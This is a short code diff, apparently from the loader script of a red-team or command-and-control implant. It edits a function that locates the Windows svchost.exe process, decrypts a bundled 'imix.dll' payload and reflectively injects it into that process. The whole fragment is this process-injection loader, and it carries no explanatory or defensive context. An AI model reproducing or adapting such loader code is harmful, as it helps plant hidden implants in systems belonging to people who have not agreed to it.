@@ -197,10 +197,10 @@ def decrypt(payload_bytes):
     return res
 
 def main():
-    if is_windows():
+    if sys.is_windows():
         for proc in process.list():
             if "svchost.exe" in proc['name']:
-                enc_bytes = assets.read_bytes("imix.dll")
+                enc_bytes = assets.read("imix.dll")
                 windows.dll_reflect(decrypt(enc_bytes), proc['pid'], 'lib_entry')
                 return
 
